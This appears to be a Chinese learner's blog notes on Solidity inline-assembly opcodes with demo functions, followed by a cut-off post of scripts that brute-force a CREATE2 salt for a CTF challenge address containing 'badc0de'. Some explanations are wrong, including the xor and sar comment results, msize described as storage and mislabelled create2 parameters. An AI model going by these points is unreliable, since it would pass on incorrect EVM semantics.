为 1，否则为 0，以二进制补码作为符号 sgt(x, y) F 如果 x &gt; y 为 1，否则为 0，以二进制补码作为符号 eq(x, y) F 如果 x &#x3D;&#x3D; y 为 1，否则为 0 iszero(x) F 如果 x &#x3D;&#x3D; 0 为 1，否则为 0 and(x, y) F x 和 y 的按位与 or(x, y) F x 和 y 的按位或 xor(x, y) F x 和 y 的按位异或 byte(n, x) F x 的第 n 个字节，这个索引是从 0 开始的 shl(x, y) C 将 y 逻辑左移 x 位 shr(x, y) C 将 y 逻辑右移 x 位 sar(x, y) C 将 y 算术右移 x 位 addmod(x, y, m) F 任意精度的 (x + y) % m mulmod(x, y, m) F 任意精度的 (x * y) % m signextend(i, x) F 对 x 的最低位到第 (i * 8 + 7) 进行符号扩展 keccak256(p, n) F keccak(mem[p…(p + n))) jump(label) - F 跳转到标签 &#x2F; 代码位置 jumpi(label, cond) - F 如果条件为非零，跳转到标签 pc F 当前代码位置 pop(x) - F 删除（弹出）栈顶的 x 个元素 dup1 … dup16 F 将栈内第 i 个元素（从栈顶算起）复制到栈顶 swap1 … swap16 * F 将栈顶元素和其下第 i 个元素互换 mload(p) F mem[p…(p + 32)) mstore(p, v) - F mem[p…(p + 32)) :&#x3D; v mstore8(p, v) - F mem[p] :&#x3D; v &amp; 0xff （仅修改一个字节） sload(p) F storage[p] sstore(p, v) - F storage[p] :&#x3D; v msize F 内存大小，即最大可访问内存索引 gas F 执行可用的 gas address F 当前合约 &#x2F; 执行上下文的地址 balance(a) F 地址 a 的余额，以 wei 为单位 caller F 调用发起者（不包括 delegatecall） callvalue F 随调用发送的 Wei 的数量 calldataload(p) F 位置 p 的调用数据（32 字节） calldatasize F 调用数据的字节数大小 calldatacopy(t, f, s) - F 从调用数据的位置 f 的拷贝 s 个字节到内存的位置 t codesize F 当前合约 &#x2F; 执行上下文地址的代码大小 codecopy(t, f, s) - F 从代码的位置 f 开始拷贝 s 个字节到内存的位置 t extcodesize(a) F 地址 a 的代码大小 extcodecopy(a, t, f, s) - F 和 codecopy(t, f, s) 类似，但从地址 a 获取代码 returndatasize B 最后一个 returndata 的大小 returndatacopy(t, f, s) - B 从 returndata 的位置 f 拷贝 s 个字节到内存的位置 t create(v, p, s) F 用 mem[p…(p + s)) 中的代码创建一个新合约、发送 v wei 并返回 新地址 create2(v, n, p, s) C 用 mem[p…(p + s)) 中的代码，在地址 keccak256( . n . keccak256(mem[p…(p + s))) 上 创建新合约、发送 v wei 并返回新地址 call(g, a, v, in, insize, out, outsize) F 使用 mem[in…(in + insize)) 作为输入数据， 提供 g gas 和 v wei 对地址 a 发起消息调用， 输出结果数据保存在 mem[out…(out + outsize))， 发生错误（比如 gas 不足）时返回 0，正确结束返回 1 callcode(g, a, v, in, insize, out, outsize) F 与 call 等价，但仅使用地址 a 中的代码 且保持当前合约的执行上下文 delegatecall(g, a, in, insize, out, outsize) F 与 callcode 等价且保留 caller 和 callvalue staticcall(g, a, in, insize, out, outsize) F 与 call(g, a, 0, in, insize, out, outsize) 等价 但不允许状态修改 return(p, s) - F 终止运行，返回 mem[p…(p + s)) 的数据 revert(p, s) - B 终止运行，撤销状态变化，返回 mem[p…(p + s)) 的数据 selfdestruct(a) - F 终止运行，销毁当前合约并且把资金发送到地址 a invalid - F 以无效指令终止运行 log0(p, s) - F 以 mem[p…(p + s)) 的数据产生不带 topic 的日志 log1(p, s, t1) - F 以 mem[p…(p + s)) 的数据和 topic t1 产生日志 log2(p, s, t1, t2) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2 产生日志 log3(p, s, t1, t2, t3) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2、t3 产生日志 log4(p, s, t1, t2, t3, t4) - F 以 mem[p…(p + s)) 的数据和 topic t1、t2、t3 和 t4 产生日志 origin F 交易发起者地址 gasprice F 交易所指定的 gas 价格 blockhash(b) F 区块号 b 的哈希 - 目前仅适用于不包括当前区块的最后 256 个区块 coinbase F 当前的挖矿收益者地址 timestamp F 从当前 epoch 开始的当前区块时间戳（以秒为单位） number F 当前区块号 difficulty F 当前区块难度 gaslimit F 当前区块的 gas 上限 2.1 基础操作码的演示2.1.1 mstore的用法语法： 1mstore(position, value) 其中，position 是要写入的内存位置，以字节为单位；value 是要写入的数据。注意，value 的大小必须是 32 字节。 演示： 1234567function mstore() external pure returns(uint) &#123; // 123 uint num = 123; assembly &#123; mstore(0x00, num) // 或 mstore(0x00, 123) return(0x00, 0x20) &#125;&#125; 返回的结果： 2.1.2 return的用法语法： 1return(start, end) 其中start 是要读取的起始内存位置，以字节为单位；end 是要读取的结尾内存位置。注意，end 的大小必须是 32 字节的倍数。 示例： 一个返回值： 12345678function _return1() external pure returns(uint) &#123; uint num = 999; assembly &#123; mstore(0x00, num) mstore(0x20, 33) return(0x20, 0x40) &#125;&#125; 一个以上的返回值： 如果函数有多个返回值，则必须将它们打包成一个元组 12345678function _return2() external pure returns(uint,uint) &#123; uint num = 666; assembly &#123; mstore(0x00, num) mstore(0x20, 999) return(0x00, 0x40) &#125;&#125; 两个示例的运行结果： 2.1.3 算术运算add，sub，mul，div，mod，exp的用法语法： 123456add(value1, value2)sub(value1, value2)mul(value1, value2)div(value1, value2)mod(value1, value2)exp(value1, value2) 其中，value1 和 value2 是要相加，减，乘，除，取模，幂运算的两个值。 示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function add(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := add(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function sub(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := sub(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mul(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mul(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function div(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := div(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function mod(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := mod(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function exp(uint x, uint y) external pure returns(uint) &#123; assembly &#123; let result := exp(x, y) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 2.1.4 位运算：not,and,or,xor,shl,shr,sar位运算知识库 1234567not(x) // ~x，对 x 按位取反and(x,y) // x 和 y 的按位与or(x,y) // x 和 y 的按位或xor(x,y) // x 和 y 的按位异或shl(x,y) // 将 y 逻辑左移 x 位shr(x,y) // 将 y 逻辑右移 x 位sar(x,y) // 将 y 算术右移 x 位 示例： uint的取值的范围是：[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182/*0:uint256: 11:uint256:115792089237316195423570985008687907853269984665640564039457584007913129639934*/function not(uint num) external pure returns(uint, uint) &#123; assembly &#123; let result := num mstore(0x00, result) mstore(0x20, not(result)) return(0x00,64) &#125;&#125;// 1010// 1011// 1010 = 10function and(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := and(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 11function or(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := or(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 1010// 1011// 1011 = 1function xor(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := xor(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 逻辑左移 将 n2 左移 n1 位// 0001// &lt;&lt; 2// 0100 = 4function shl(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shl(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 逻辑右移 将 n2 右移 n1 位// 0100// &gt;&gt; 2// 0001 = 1function shr(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := shr(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;// 算术右移 将 n2 算术右移 n1 位// 1011 = 11// &gt;&gt; 2// 0010 = 14function sar(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := sar(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 其中，shr和sar的结果是相同的，我认为这和solidtiy中无符号整数有关 2.1.5 比较运算符：lt,gt,eq,iszero语法： 1234lt(x, y) // 如果 x &lt; y 为 1，否则为 0gt(x, y) // 如果 x &gt; y 为 1，否则为 0eq(x, y) // 如果 x == y 为 1，否则为 0iszero(x) // 如果 x == 0 为 1，否则为 0 示例： 1234567891011121314151617181920212223242526272829303132function lt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := lt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125;function gt(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := gt(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function eq(uint n1, uint n2) external pure returns(uint) &#123; assembly &#123; let result := eq(n1, n2) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; function iszero(uint n1) external pure returns(uint) &#123; assembly &#123; let result := iszero(n1) mstore(0x00, result) return(0x00, 0x20) &#125;&#125; 运行结果： 心得：我觉得这个操作码简单理解起来就是：操作是一回事，存是一回事，取又是另一回事。先操作，再存，最后取，例如： 123let sum := add(x,y)mstore(0x00, sum)return(0x00, 0x20) *** 这就是典型的先执行 add操作，再将算出来的 sum 结果保存到 EVM中，最后再从EVM中取出来*** 2.2 进阶操作码的演示2.2.1 addmod,mulmod的用法语法： 12addmod(x, y, m) //任意精度的 (x + y) % mmulmod(x, y, m) //任意精度的 (x * y) % m “addmod” 操作符的语法为：addmod(x, y, m)。它将两个参数 x 和 y 相加，然后将结果对参数 m 取模，最后返回结果。”mulmod”同理。 示例： 1234567891011121314151617function _addmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := addmod(x, y, m) &#125; return result;&#125;function _mulmod(uint256 x, uint256 y, uint256 m) public pure returns (uint256) &#123; uint256 result; assembly &#123; result := mulmod(x, y, m) &#125; return result;&#125; 运行结果： 2.2.2 keccak256的用法关于string类型的存储方式 语法： 1keccak256(p, n) //keccak(mem[p...(p + n))) 示例： 12345678910111213141516171819function _keccak256(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := keccak256(add(message, 32), mload(message)) &#125; return result; &#125;function _keccak256_1(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(message)); return result; &#125;function _keccak256_2(string memory message) public pure returns (bytes32) &#123; bytes32 result = keccak256(abi.encode(message)); return result; &#125; 运行结果： 从结果中可以看到，汇编中的keccak256使用的打包方式是紧打包即abi.encodePacked() 拓展： 解读： assembly &#123;result := keccak256(add(message, 32), mload(message))&#125; 首先知道，string类型的变量在 EVM中的存储方式类似于动态数组，在智能合约的书写位置即插槽slot存储的是，string变量值存储的位置，而在存储具体位置上，string变量前32位存储的是string值的长度，32位之后才是具体的 string变量的值。 我们可以通过代码验证一下： 1234function _stringToBytes(string memory message) public pure returns (bytes memory) &#123; bytes memory result = (abi.encode(message)); return result;&#125; 运行结果： 由运行结果的三个部分我们看出： 2: 是参数biyou 在内存中的存储位置（应该是slot2）； 5: 是参数biyou的长度； 6269796f75:参数的内容： &quot;biyou&quot; 的 UTF-8 编码（在这里等同于 ASCII 编码），并在右侧（低位）用 0 值字节补充到 32 字节。 其次，(add(message, 32)，是为了找到 message在内存中的地址，可以理解为，经过 (add(message, 32)这一步骤之后，message的指针已经指向了包括 message的长度以及具体数据这个整体的第一个索引（经过实际验证之后这是错误的）由如下代码以及结果可知，(add(message, 32)指向的是跳过了字符串长度，字符串具体值的第一个索引。 代码： 1234567function add(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := add(message, 32) return(result,32) &#125; &#125; 运行结果： 说明：如果直接填入message好像会自动找到message值的具体存储位置 然后，mload(message)，则是找到message的长度，通过代码验证 代码： 1234567function mload(string memory message) public pure returns (bytes32) &#123; bytes32 result; assembly &#123; result := mload(message) &#125; return result;&#125; 运行结果： 总结：add(message, 32)先将指针指向message具体的值, mload(message)获取message的长度，keccak256(add(message, 32), mload(message))则是对message具体的值进行hash，即keccak256(0x6269796f75000000000000000000000000000000000000000000000000000000),其结果和keccak256(abi.encodePacked(message))结果相同。 2.2.3 mload的用法语法： 1mload(p) //mem[p...(p + 32)) 读取指定位置p后的 32位内存地址中的值 示例： 1234567891011function mload(uint index) public pure returns(uint) &#123; uint result; assembly &#123; let n1 := 666 let n2 := 999 mstore(0x00,n1) mstore(0x20,n2) result := mload(index) &#125; return result;&#125; 运行结果： 2.2.4 number的用法语法： 1number() // 当前区块 示例： 1234567function getCurrentInstructionNumber() public view returns (uint) &#123; assembly &#123; let instructionNumber := number() mstore(0x00,instructionNumber) return(0x00,32) &#125;&#125; 运行结果： 2.2.5 sload 和 sstore的用法语法： 12sload(p) // storage[p]sstore(p, v) // storage[p] := v ① 其中，p是一个uint类型的值，表示要读取字的存储器地址。sload指令的作用是从以p为地址的存储器位置中读取一个字，并将其作为uint类型的值返回。类似于使用web3 或 etherjs的 gerAtStorage(p)的操作 ② 其中，p是一个uint类型的值，表示要存储字的存储器地址，v是一个uint类型的值，表示要存储的字的值。sstore指令的作用是将v存储到以p为地址的存储器位置中。具体来说，sstore指令将字节序列v的前32个字节存储到以p为地址的存储器位置中。 示例： 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract assembly_day1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; // 查询当前合约的拥有者 function getOwner() external view returns(address) &#123; return owner; &#125; function sload(uint position) public view returns (uint) &#123; uint value; assembly &#123; value := sload(position) &#125; return value; &#125; function sstore(uint position,uint _addr) public returns (uint) &#123; assembly &#123; sstore(position, _addr) let result := sload(position) return(mul(position, 32), 32) &#125; &#125;&#125; 运行结果： 调用sstore之前： 调用sstore之后： 2.2.6 msize的用法语法： 1msize() //内存大小，即最大可访问内存索引 msize指令的作用是返回当前合约的存储器大小，以字节为单位。存储器大小是当前合约的存储器使用量，用于存储合约的状态变量和其他数据。 示例： 1234567function msize() public view returns (uint) &#123; uint size; assembly &#123; size := msize() &#125; return size;&#125; 运行结果： 2.2.7 gas的用法语法： 1gas() // 执行可用的 gas gas标识符返回一个uint类型的值，表示当前合约中可用的燃料数量。燃料是一种代币，用于支付交易费用和合约执行费用。在Solidity中，可以使用gas标识符获取当前合约中还剩余的燃料数量，以便在执行合约代码时进行相应的控制。 示例： 1234567function gas() public view returns (uint) &#123; uint remaining; assembly &#123; remaining := gas() &#125; return remaining;&#125; 运行结果： 2.2.8 address的用法语法： 1address() //当前合约 / 执行上下文的地址 address标识符可以与其他指令结合使用，用于获取合约地址或其他地址的信息。 示例： 123456789101112131415function getContractAddress() public view returns (address) &#123; address addr; assembly &#123; addr := address() &#125; return addr;&#125;function getCallerAddress() public view returns (address) &#123; address addr; assembly &#123; addr := caller() &#125; return addr;&#125; 运行结果： 2.2.9 balance的用法语法： 1balance(a) // 地址 a 的余额，以 wei 为单位 其中，a是一个地址类型的值，表示要查询余额的地址。balance标识符的作用是返回指定地址的余额，以wei为单位。 示例： 1234567function getBalance(address account) public view returns (uint) &#123; uint _balance; assembly &#123; _balance := balance(account) &#125; return _balance;&#125; 运行结果： 2.2.10 caller的用法语法： 1caller() // 调用发起者 caller标识符返回一个address类型的值，表示当前函数的调用者地址。调用者是指调用当前函数的合约或外部账户。 示例： 1234567function getCaller() public view returns (address) &#123; address callerAddr; assembly &#123; callerAddr := caller() &#125; return callerAddr;&#125; 运行结果： 2.2.11 extcodesize的用法语法： 1extcodesize(address) //地址 address 的代码大小 其中，address表示要获取代码长度的合约地址。 示例： 1234567function extcodesize(address _test) external view returns(uint) &#123; assembly &#123; let size := extcodesize(_test) mstore(0x00, size) return(0x00, 0x20) &#125;&#125; 运行结果： 2.2.12 create的用法语法： 1create(v, p, s) // 用 mem[p...(p + s)) 中的代码创建一个新合约、发送 v wei 并返回 新地址 其中，v表示要向新合约发送的以太币数量，p表示要复制到新合约地址内存中的代码的偏移量，s表示要复制到新合约地址内存中的代码的长度。 示例： 123456789101112131415161718192021222324252627// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; function createNewContract(uint value, bytes memory code) public returns (address) &#123; address newContract; assembly &#123; newContract := create( value, // 表示要向新合约发送的以太币数量 add(code, 0x20), // 表示跳过数组长度 mload(code)) // 读取code的长度 &#125; return newContract; &#125;&#125; 运行结果： 2.2.13 create2的用法语法： 1create2(v, n, p, s) // 用 mem[p...(p + s)) 中的代码，在地址 keccak256(&lt;address&gt; . n . keccak256(mem[p...(p + s))) 上 创建新合约、发送 v wei 并返回新地址 其中，v表示要向新合约发送的以太币数量，n表示要复制到新合约地址内存中的代码的偏移量，p表示要复制到新合约地址内存中的代码的长度，s是一个任意的32字节值，用于生成新合约地址。 示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125;&#125;contract assembly_day2 &#123; // /* 使用代码中 create2() */ function create2NewContractByCode(string memory salt) public view returns (address) &#123; bytes memory code = type(test).creationCode; address result = address(uint160(uint( keccak256( abi.encodePacked( uint8(0xff), address(this), keccak256(abi.encodePacked(salt)), keccak256(code) ) ) ))); return result; &#125; // /* 使用内联汇编自带的 create2() */ function create2NewContractByInline(string memory salt) public returns (address) &#123; bytes memory code = type(test).creationCode; bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value 表示要向新合约发送的以太币数量 add(code, 32), // 表示跳过数组长度 mload(code), // 读取code的长度 _salt // 盐 ) &#125; return result; &#125;&#125; 运行结果： 由结果可以看出，采用两种方法创建出的新合约地址是相同的； 需要注意的是，两种方法中各参数所处的位置是很不相同的。 2.2.14 selfdestruct的用法语法： 1selfdestruct(_addr) // _addr表示合约注销之后钱转移的地址 address表示要将剩余的以太币发送到的目标地址。 示例： 12345function _selfdestruct(address _addr) external payable &#123; assembly &#123; selfdestruct(_addr) &#125;&#125; 运行结果： 未执行前： contract test的余额： 执行之后： contract test的余额： 2.2.15 origin的用法语法： 1origin() origin指令用于获取当前交易的发送者地址。与msg.sender不同的是，origin指令返回的是交易的最初发送者地址，即交易链的起点。 示例： 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;= 0.8.0;contract test &#123; string public name; constructor() &#123; name = &quot;biyou&quot;; &#125; function testOrigin(address _addr) public view returns(address) &#123; address result = assembly_day2(_addr).origin(); return result; &#125;&#125;contract assembly_day2 &#123; constructor() payable &#123; &#125; function origin() public view returns (address) &#123; address _origin; assembly &#123; _origin := origin() &#125; return _origin; &#125;&#125; 运行结果： 2.2.16 blockhash的用法语法： 1blockhash(blockNumber) //区块号 blockNumber 的哈希 - 目前仅适用于不包括当前区块的最后 256 个区块 blockNumber表示要获取哈希值的块号。请注意，由于Ethereum区块链的设计，只能获取最近的256个块的哈希值。因此，blockNumber的值必须在当前块与最近的256个块之间。 示例： 123456789101112// 如下写法hash的值是 0x0000000000000000000000000000000000000000000000000000000000000000// 因为 当前区块还没有出生，语法写的很清楚了，是我没有理解到位function getBlockHash() public view returns (uint, bytes32) &#123; bytes32 hash; uint num; assembly &#123; num := number() hash := blockhash(num) // number() 获取当前区块号 &#125; return (num, hash); &#125; 运行结果： 2.2.17 timestamp的用法语法： 1timestamp() timestamp指令用于获取当前块的时间戳。时间戳表示当前块生成的时间，以秒为单位。 示例： 12345678function getCurrentTimestamp() public view returns (uint) &#123; uint _timestamp; assembly &#123; _timestamp := timestamp() &#125; return _timestamp;&#125; 运行结果： 2.2.18 call的用法语法： 1call(g, a, v, in, insize, out, outsize) 其中，g是可用的gas数量，a是要调用的合约地址，v是要发送的以太币数量，in是要发送的调用数据，insize是调用数据的长度，out是一个指向输出缓冲区的指针，outsize是输出缓冲区的大小。 示例： 12345678910111213function fun(uint256 num1, uint256 num2) external returns (uint256) &#123; return sum = num1 + num2;&#125;function inline_call() public returns(bool success)&#123; bytes memory data = abi.encodeWithSignature(&quot;fun(uint256,uint256)&quot;, 260, 261); address to = address(this); assembly &#123; success := call(gas(), to, 0, add(data, 0x20), mload(data), 0, 0) &#125;&#125; 运行结果：","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"内联汇编","slug":"内联汇编","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"}]},{"title":"calAddressByCreate2","slug":"Basic_Knowledge/solidity/calAddressByCreate2","date":"2023-05-25T15:10:10.000Z","updated":"2023-05-25T15:10:10.000Z","comments":true,"path":"2023/05/25/Basic_Knowledge/solidity/calAddressByCreate2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/25/Basic_Knowledge/solidity/calAddressByCreate2/","excerpt":"","text":"calAddressByCreate21. 【使用python】这里是借鉴张学长的🤣 1.1 安装web3库1pip install web3 1.2 计算代码12345678910111213141516171819202122232425262728from web3 import Web3# value of your address(this) # must delet 0x# example：0x5B38Da6a701c568545dCfcB03FcB875f56beddC4address = &quot;5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;# 固定常量 0xffconst_value = &quot;0xff&quot;# 将前两个值拼接起来s1 = const_value + address# 这个为代部署合约的字节码，可以通过keccak256(abi.encodePacked(bytecode))来计算s3 = &#x27;&#x27;i = 0while(True): salt = hex(i)[2:].rjust(64, &#x27;0&#x27;) s = s1+salt+s3 hashed = Web3.keccak(hexstr=s) hashed_str = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in hashed]) if &#x27;badc0de&#x27; in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(hashed) python暂时没学好，等过段时间再回来解读 2.【使用ethereumjs】2.1 安装ethereumjs库1npm install ethereumjs-util 2.2 计算代码bytecode的值前要填 0x 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const eth = require(&#x27;ethereumjs-util&#x27;);// a. 常数const const_num = &quot;0xFF&quot;;// b. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 const str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值 const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;let bytecodeToHash = eth.bufferToHex(eth.keccakFromHexString(bytecode));// 去掉0xbytecodeToHash = bytecodeToHash.slice(2, bytecodeToHash.length);let salt = 0;while (true) &#123; // 1. Convert i to hex, and it pad to 32 bytes: // 1. 将i转为16进制的字符串，padStart右对齐，用 0 补齐32bytes // var saltToBytes = salt.toString(16).padStart(64, &#x27;0&#x27;); let saltToHex = &quot;0x&quot; + salt.toString(16); let saltToHash = eth.bufferToHex(eth.keccakFromHexString(saltToHex)); saltToHash = saltToHash.slice(2, saltToHash.length); // 2. Concatenate this between the other 2 strings // 2. 将 string1 saltToBytes string2三个字段的值拼接在一起 var concatString = str1.concat(saltToHash).concat(bytecodeToHash); /** * 3. Hash the resulting string * 对上行代码的 concatString 进行hash： * eth.keccakFromHexString() 是 Ethereum.js 库中的一个方法， * 用于对一个十六进制字符串进行 Keccak-256 哈希运算返回值类型为 Buffer * */ var hashed = eth.bufferToHex(eth.keccakFromHexString(concatString)); // 这个不对 因为 eth.keccak256()的参数不支持string类型，只支持Buffer类型 // var hashed = eth.bufferToHex(eth.keccak256(concatString)) // 4. Remove leading 0x and 12 bytes // 5. Check if the result contains badc0de // hashed.slice(26,20) if (hashed.slice(26, hashed.length).includes(&#x27;badc0de&#x27;)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hashed.slice(26, hashed.length)&#125;`); break; &#125; salt++;&#125; 3. 【ethersjs】3. 1 安装ethersjs库1npm install ethers 3.2 计算代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 计算合约地址所需要的四个值 * * 1. 0xFF：一个常数，避免和CREATE冲突 2. 创建者地址 3. salt（盐）：一个创建者给定的数值 4. 待部署合约的字节码（bytecode） */// 1. 常数const const_num = &quot;0xFF&quot;;// 2. 创建者地址（合约地址）// 一般情况下是： address(this)// 拼接的时候不能包含 `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. 拼接 let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. 代部署合约的字节码的hash值const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;// 5.1 对bytecode 进行hash运算 这个只能用单引号// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 下面这行代码也行，因为对 bytecode进行紧打包的结果不变// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. 定义一个盐，以及一个所求字段let salt = 0;const value = &quot;badc0de&quot;; // CTF靶场的题// 遍历出指定值，求出saltwhile (true) &#123; // 将salt转为16进制，用0填充为64位 // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length); // 再次拼接 顺序： 常数 创建者地址 盐 字节码的hash值 // bytecodeToHash.slice(2,bytecodeToHash.length): 删除 `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // 对 str2 进行hash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); // console.log(saltBuffer) // 先将打包好的str2 转为 utf8的字节数组 // let saltUtf8Bytes = ethers.utils.toUtf8Bytes(str2); // 将 saltUtf8Bytes 转化为buffer // let saltBuffer = ethers.utils.arrayify(saltUtf8Bytes); // 对 saltBuffer 进行hash // let hash 